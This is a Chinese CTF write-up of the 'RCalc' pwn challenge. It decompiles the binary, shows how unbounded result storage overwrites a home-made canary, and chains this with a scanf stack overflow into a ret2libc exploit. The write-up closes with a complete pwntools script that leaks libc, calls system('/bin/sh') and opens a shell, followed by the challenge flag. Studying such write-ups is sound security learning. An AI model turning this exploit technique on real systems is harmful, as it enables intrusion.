# RCalc

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=53e370ff-1711-422b-87e1-3be42cdc5288_2&task_category_id=2)

真的对堆一窍不通。

-   Arch:     amd64-64-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    No canary found
    <br>NX:       NX enabled
    <br>PIE:      No PIE (0x400000)

这次不错啊，只要没开pie我就高兴了，开了pie真的太难用原生gdb调试了。

```c
void Main(void)
{
  long lVar1;
  undefined name [264];
  long local_10;
  local_10 = GetRandom();
  printf("Input your name pls: ");
  __isoc99_scanf(&DAT_00401203,name);
  printf("Hello %s!\nWelcome to RCTF 2017!!!\n",name);
  puts("Let\'s try our smart calculator");
  DoCalculate();
  lVar1 = ExitAndCheckCanary();
  if (lVar1 != local_10) {
    CanaryFailed();
  }
  return;
}
```

结果发现其实是有canary的，只不过是由出题人自己实现的。每次进入函数都用GetRandom随机出来一个值作为canary，别的机制和正常canary一样。好像之前也遇到过类似的，毕竟正常人谁自己做canary呢？

```c
void DoCalculate(void)
{
  int iVar1;
  long lVar2;
  char answer [24];
  long local_20;
  long local_18;
  undefined8 local_10;
  local_18 = GetRandom();
  do {
    while( true ) {
      PrintMenu();
      iVar1 = GetInputNumber();
      local_20 = (long)iVar1;
      if (local_20 != 1) break;
      local_10 = Add();
LAB_00400f13:
      printf("The result is %d\n",local_10);
      printf("Save the result? ");
      read(0,answer,0x10);
      iVar1 = strncmp("yes",answer,3);
      if (iVar1 == 0) {
        StoreNumber(local_10);
      }
    }
    if (local_20 == 2) {
      local_10 = Sub();
      goto LAB_00400f13;
    }
    if (local_20 == 3) {
      local_10 = Mod();
      goto LAB_00400f13;
    }
    if (local_20 == 4) {
      local_10 = Multi();
      goto LAB_00400f13;
    }
    if (local_20 == 5) {
      lVar2 = ExitAndCheckCanary();
      if (lVar2 != local_18) {
        CanaryFailed();
      }
      return;
    }
    puts("Invaild choice!");
  } while( true );
}
```

一个菜单。不同选项就是不同操作。这些操作我都看了，sub真就只相减，mod真就只取余，全部都是这样，不可能有漏洞。秉承着“多一个功能就多一条死路”的准则，我们发现这个智能计算器相对于普通的程序小作业多了存储结果的功能。看看内部实现。

```c
void StoreNumber(undefined8 param_1)
{
  long *plVar1;
  long lVar2;
  plVar1 = DAT_006020f8 + 1;
  lVar2 = *DAT_006020f8;
  *DAT_006020f8 = lVar2 + 1;
  *(undefined8 *)(*plVar1 + lVar2 * 8) = param_1;
  return;
}
```

一看就是放堆上了。我永远搞不清楚pwn题有关堆的操作，很多题都有存储功能，每个的实现都不一样。只要我够会刷题总有一天全部看个遍。不过这里不用理解具体怎么存起来的，就这几行代码明显没有检查存储数量的语句，那就可以无限存储。而堆空间不是无限的，因此在存了n个数字后堆一定会溢出。既然能溢出，溢出的地点就很关键了。

```c
ulong GetRandom(void)
{
  long *plVar1;
  long lVar2;
  int iVar3;
  ulong uVar4;
  uint local_2c;
  long local_28;
  FILE *local_20;
  if (*DAT_006020f0 == 0) {
    local_20 = fopen("/dev/urandom","r");
    fread(&local_2c,1,4,local_20);
    fclose(local_20);
  }
  else {
    local_2c = (uint)*(undefined8 *)(*DAT_006020f0 * 8 + -8 + DAT_006020f0[1]);
  }
  srand(local_2c);
  iVar3 = rand();
  local_28 = (long)iVar3;
  uVar4 = local_28 << 0x20;
  iVar3 = rand();
  uVar4 = (long)iVar3 | uVar4;
  plVar1 = DAT_006020f0 + 1;
  lVar2 = *DAT_006020f0;
  *DAT_006020f0 = lVar2 + 1;
  *(ulong *)(*plVar1 + lVar2 * 8) = uVar4;
  return uVar4;
}
```

canary被放到了DAT_006020f0里。等下，结果存储到哪里来着？DAT_006020f8。这俩玩意是挨着的啊，调试可得具体偏移值：(0xceb160-0xceb050) // 8 = 0x22。存储0x22个数字后第0x23个结果会溢出到canary，也就是我们可以随意控制canary了。但是我们费这么大力控制canary干啥呢？回头看Main函数，发现漏掉了一个很明显的栈溢出。

```c
__isoc99_scanf(&DAT_00401203,name);
```

栈溢出不用多说，典型的ret2libc。先泄露libc中的地址算偏移。由于是使用scanf来接收输入的，因此我们的payload中不能出现0x20(空格)，也就是地址里不能有0x20。这个条件排除了大部分libc中的函数，__libc_start_main和__gmon_start__存活，那就随便选一个泄露吧。老朋友puts也不能用了，printf倒是可以。exp如下，参考（抄自）[此处](https://www.lshykx.fun/posts/5600bec/)。破防世界给的libc错了，是libc6_2.23-0ubuntu10_amd64这个。

```python
from pwn import *
context.log_level = 'debug'

debug=0
if debug:
    io=process("./RCalc")
else:
    io = remote('61.147.171.105',50311)
puts_plt = 0x400850
__libc_start_main_ = 0x601FF0

rdi_ret = 0x0000000000401123
main_addr = 0x0000000000401036

payload=b""
def pass_canary(k):
    for i in range(35+k):
        io.recvuntil("Your choice:")
        io.sendline("1")
        io.recvuntil("input 2 integer: ")
        io.send("0\n0\n")
        io.recvuntil("Save the result? ")
        io.sendline("yes")
    io.recvuntil("Your choice:")
    io.sendline("5")

if __name__ =="__main__":
    payload+=b"\x00"*0x110
    payload+=p64(0)
    payload+=p64(rdi_ret)
    payload+=p64(__libc_start_main_)
    payload+=p64(puts_plt)
    payload+=p64(main_addr)

    io.recvuntil("Input your name pls: ")
    io.sendline(payload)

    pass_canary(0)

    libc_start_main_addr = u64(io.recvn(6).ljust(8, b'\x00'))
    print(hex(libc_start_main_addr))
    libc_addr_base=libc_start_main_addr-0x020740

    log.success("libc_start_main_addr "+hex(libc_start_main_addr))
    log.success("libc_addr_base "+hex(libc_addr_base))

    system_addr=libc_addr_base+0x045390
    bin_sh_addr=libc_addr_base+0x18cd57

    payload=b"\x00"*0x110
    payload+=p64(0)
    payload+=p64(rdi_ret)
    payload+=p64(bin_sh_addr)
    payload+=p64(system_addr)
    payload+=p64(main_addr)

    io.recvuntil("Input your name pls: ")
    io.sendline(payload)

    pass_canary(0)

    io.interactive() 
```

- ### Flag
  > cyberpeace{85f187145744453b5a1db4d140042526}